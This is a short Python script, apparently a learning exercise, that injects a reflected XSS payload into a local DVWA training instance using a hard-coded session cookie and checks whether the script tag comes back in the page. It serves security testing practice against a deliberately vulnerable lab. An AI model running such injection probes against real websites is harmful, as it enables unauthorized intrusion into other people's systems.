from helper_generic_tags import GenericGetTags
import requests


class Xss:

    url = "http://localhost/DVWA/vulnerabilities/xss_r/"

    input_tags = GenericGetTags.get_tags(url, "input", {"type" : "text"} )

    if input_tags:
        headers = {'Cookie': 'security=low; PHPSESSID=hjebv958mfu9u3ao2ropjl6'}
        script = "<script>alert('XSS')</script>"
        inject_data = {"name" : script, "Submit" : "Submit"}
        req = requests.get(url, params = inject_data, headers = headers )

        if script in req.text:
            print("XSS succeed!")
        else:
            print("XSS did not succeed!")

    else:
        print("XSS did not succeed!")

